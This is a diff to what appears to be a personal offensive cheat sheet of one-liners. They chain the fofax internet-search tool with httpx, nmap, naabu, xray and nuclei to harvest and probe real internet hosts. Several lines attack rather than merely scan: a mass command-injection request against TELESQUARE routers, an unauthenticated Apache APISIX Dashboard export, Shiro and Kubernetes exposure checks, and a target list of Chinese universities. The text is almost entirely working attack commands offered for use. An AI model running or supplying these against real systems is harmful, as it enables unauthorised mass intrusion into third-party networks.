@@ -8,9 +8,19 @@
 # skill 
 ```
 >https://fofax.xiecat.fun/link
+fofax -qf query.txt -fe -fs 10 -e
+fofax -iuf baidu.txt -ubq
+fofax -q 'domain="baidu.com"' |httpx -path "/favicon.ico" -mc 200>baidu.txt
+
 echo '(app=TELESQUARE-TLR-2005KSH)' | fofax -fs 59000 -ffi | httpx -path '/cgi-bin/admin.cgi?Command=sysCommand&Cmd=ifconfig' -mr addr -t 700 >> rout_vuln.txt
 echo '(title="职业学院" || title="大学" || title="职业技术学院" || title="学院") && country="CN"' | fofax -ff 'domain' -fs 10 | naabu
 nmap -iL <(echo 'app="APACHE-Solr"' | fofax -fs 10 -ff ip)
+./dismap -file <(echo 'title="login"' | fofax -fs 10 -ffi)
+fofax  -q 'title="Apache APISIX Dashboard"' -ffi|httpx -title
+fofax -q 'title="Apache APISIX Dashboard"' -ffi | httpx -path "/apisix/admin/migrate/export" -status-code -mc 200 -ms '{"Counsumers":[],"Routes'
+echo 'header="rememberme=deleteMe" || header="shiroCookie"' | fofax -fs 100 -e -ec | httpx -o shiro.txt && xray ws ss --uf shiro.txt
+fofax -q 'fx=kubernetes' -fe | httpx | nuclei -t ~/nuclei-templates/misconfiguration/kubernetes/kubernetes-pods.yaml
+echo 'fx=kubernetes' | fofax  -fe  -ffi | nuclei -t ~/nuclei-templates/misconfiguration/kubernetes/kubernetes-pods.yaml
 
 
 katana.exe -u http://spacex.com -d 7 -ef css,js,img,jpg -proxy http://127.0.0.1:7777
